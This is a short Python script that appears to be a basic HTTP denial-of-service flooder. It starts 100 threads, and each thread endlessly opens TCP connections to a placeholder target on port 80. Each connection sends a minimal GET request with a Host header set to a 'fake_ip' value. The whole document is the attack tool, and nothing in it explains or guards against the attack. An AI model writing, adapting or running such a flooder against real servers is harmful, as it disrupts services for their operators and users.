import threading
import socket

target='X.X.X.X'
fake_ip='X.X.X.X'
port=80

def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(100):
    thread=threading.Thread(target=attack)
    thread.start()
